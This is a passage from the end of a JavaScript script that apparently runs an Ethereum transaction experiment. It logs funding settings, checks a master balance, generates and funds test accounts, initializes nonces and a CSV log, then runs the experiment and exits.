        `Funding/account          : ${FUND_AMOUNT_ETH} ETH`
    );

    console.log(
        `Funding gas              : ${FUND_GAS_PRICE_GWEI} gwei`
    );

    console.log(
        `Funding batch size       : ${FUNDING_BATCH_SIZE}`
    );

    console.log(
        "============================================================"
    );


    // ========================================================
    // BALANCE
    // ========================================================

    await checkMasterBalance(
        fundAmountWei,
        fundingGasPriceWei
    );


    // ========================================================
    // CREATE ACCOUNTS
    // ========================================================

    const accounts =
        generateAccounts(
            ACCOUNT_COUNT
        );


    // ========================================================
    // PARALLEL FUNDING
    // ========================================================

    await fundAccounts(
        accounts,
        chainId,
        fundingGasPriceWei,
        fundAmountWei
    );


    // ========================================================
    // READ INITIAL NONCES
    // ========================================================

    await initializeNonces(
        accounts
    );


    // ========================================================
    // CSV
    // ========================================================

    initializeCSV();


    // ========================================================
    // START EXPERIMENT
    // ========================================================

    await runExperiment(
        accounts,
        chainId,
        encodedCall,
        baseGasPriceWei
    );
}

// ============================================================
// START
// ============================================================

main()

    .then(
        () => {

            console.log(
                "\nExperiment completed successfully."
            );

            process.exit(
                0
            );
        }
    )

    .catch(
        error => {

            console.error(
                "\nFatal error:"
            );

            console.error(
                getErrorMessage(error)
            );

            process.exit(
                1
            );
        }
    );